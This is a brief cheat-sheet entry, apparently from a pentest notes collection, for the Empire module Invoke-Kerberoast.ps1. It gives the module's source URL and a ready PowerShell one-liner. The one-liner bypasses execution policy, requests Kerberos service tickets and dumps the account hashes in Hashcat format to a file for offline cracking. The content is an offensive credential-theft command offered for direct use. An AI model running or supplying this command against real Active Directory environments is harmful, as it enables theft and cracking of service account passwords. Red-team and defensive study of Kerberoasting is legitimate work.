# Name
Invoke-Kerberoast.ps1

## Usage
```
powershell -ep bypass -c "Import-Module .\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
```

## Source
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1

